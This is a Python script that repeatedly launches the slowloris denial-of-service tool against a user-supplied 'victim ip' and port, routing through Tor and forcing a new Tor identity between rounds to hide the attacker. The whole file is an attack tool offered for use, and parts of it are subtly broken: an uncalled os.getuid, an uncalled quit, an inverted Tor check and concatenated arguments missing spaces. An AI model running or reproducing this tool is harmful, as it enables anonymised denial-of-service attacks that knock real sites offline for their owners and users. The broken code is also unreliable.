import os
import banner
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("ip",help="victim ip")
parser.add_argument("port",help="victim port")
parser.add_argument("socket", help="number of sockets to use in test")
parser.add_argument("randomuseragent", help="Randomizes user-agents with each request (y/n)")
parser.add_argument("sleeptime",help="time to sleep between each header sent")
parser.add_argument("https",help="use https for attack (y/n)")
args = parser.parse_args()
def checktor():
    check = os.system("curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?")
    if (check == 0) :
        print "please run tor (service tor start && tor (in terminal ))"
def ipchanger():
    os.system("killall -HUP tor")
def checkroot():
    uid = os.getuid
    if (uid == 0) :
        print "please run as root "
        quit
def attack() :
    checkroot()
    checktor()
    if (args.randomuseragent == 'y') :
	if(args.https == 'y') :
	        os.popen("slowloris -p " + args.port + " -ua " + "--https " + "-s " + args.socket + " --sleeptime " + args.sleeptime+ " " + args.ip)
    if (args.randomuseragent == 'n') :
	if(args.https == 'y') :
	        os.popen("slowloris -p " + args.port + " --https " + "-s " + args.socket + " --sleeptime " + args.sleeptime+ " " + args.ip)
    if (args.randomuseragent == 'y') :
	 if(args.https == 'n') :
	        os.popen("slowloris -p " + args.port + "-ua " + "-s " + args.socket + "--sleeptime " + args.sleeptime + args.ip)
    if(args.randomuseragent == 'n') :
	if(args.https == 'n') :
	        os.popen("slowloris -p " + args.port + " -s " + args.socket + " --sleeptime " + args.sleeptime +" " + args.ip)
        
def main() :
	banner.banner()
    	while(True):
       		attack()
       		ipchanger()
main()
